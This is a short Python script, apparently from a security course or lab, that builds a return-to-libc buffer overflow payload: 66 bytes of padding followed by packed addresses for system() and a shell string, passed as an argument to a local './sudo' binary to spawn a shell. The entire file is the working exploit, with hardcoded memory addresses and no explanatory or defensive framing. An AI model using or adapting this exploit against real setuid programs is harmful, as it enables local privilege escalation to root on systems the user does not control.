import os, sys, struct


PATH_TO_SUDO = './sudo'
PATH_TO_GDB = '/usr/bin/gdb'

password = '1234'


def get_arg():
	offset = 66
	shell_ra = 0xb7d7e82b
	system_ra = 0xb7c5dda0
	return 'a' * offset + struct.pack('<I',system_ra) + 'a' * 4+ struct.pack('<I',shell_ra)


def main(argv):
    os.execl(PATH_TO_SUDO, PATH_TO_SUDO, get_arg());


if __name__ == '__main__':
    main(sys.argv)